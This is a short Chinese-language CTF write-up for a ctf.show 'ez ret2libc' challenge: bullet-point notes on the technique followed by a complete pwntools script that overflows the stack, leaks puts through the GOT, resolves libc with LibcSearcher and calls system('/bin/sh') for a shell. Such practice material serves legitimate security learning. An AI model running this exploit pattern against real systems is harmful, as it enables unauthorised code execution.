# 挑战简介
ez ret2libc

# 思路
简单的ret2libc，前面超前练了许多，倒是正式开始做的时候就觉得清澈不少  

自己总结下来就是  
- 栈溢出寻找偏移量
- 利用内核有的函数，比如write，puts等，通过plt配合got来泄露函数的真正的地址
- 虽然地址是随机的，但是偏移量是固定的，只要你找出libc的版本；所以你可以通过libcsearcher来判断远端主机libc版本
- libc版本出来后，就可以用**泄露出来的函数地址-版本函数地址**，来取得libc的基地址
- 最后利用**基地址+你想要的函数地址此版本的偏移量**来取得你想要的函数地址或bin_sh地址
- 再利用一次栈溢出，执行即可

```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28179)
elf = ELF('./pwn')


offset = b'a'*(0x9C + 0x4)

sh_addr = 0x804B028

vuln = elf.symbols['ctfshow']

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']
 

payload = offset + p32(puts_plt) + p32(vuln) + p32(puts_got)

p.sendline(payload)

puts_real = u32(p.recvuntil(b'\xf7')[-4:])
print(hex(puts_real))

libc = LibcSearcher('puts',puts_real)
libc_base = puts_real - libc.dump('puts')
print(hex(libc_base))

bin_sh = libc_base + libc.dump('str_bin_sh')
system = libc_base + libc.dump('system')

payload = offset + p32(system) + p32(0xdeadbeef) + p32(bin_sh)

print(payload)

p.sendline(payload)

p.interactive()

```
